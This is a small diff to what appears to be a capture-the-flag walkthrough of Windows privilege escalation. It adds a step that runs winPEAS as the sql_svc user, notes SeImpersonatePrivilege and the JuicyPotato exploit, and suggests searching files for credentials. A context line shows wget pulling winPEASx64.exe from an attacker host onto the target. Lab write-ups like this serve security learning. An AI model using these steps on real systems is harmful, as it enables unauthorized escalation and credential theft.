@@ -145,8 +145,14 @@ On the Target Machine, execute wget in order to download the program from the Lo
 powershell
 wget http://@IP/winPEASx64.exe -outfile winPEASx64.exe
 ```
-[//]: User must have perm
+[//]: User must have permission in that directory
 
+> Exectue winPEAS
+```bash
+PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
+```
+
+Can observer that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato). However, check the two existing files where credentials could be possible to be found.
 
 
 
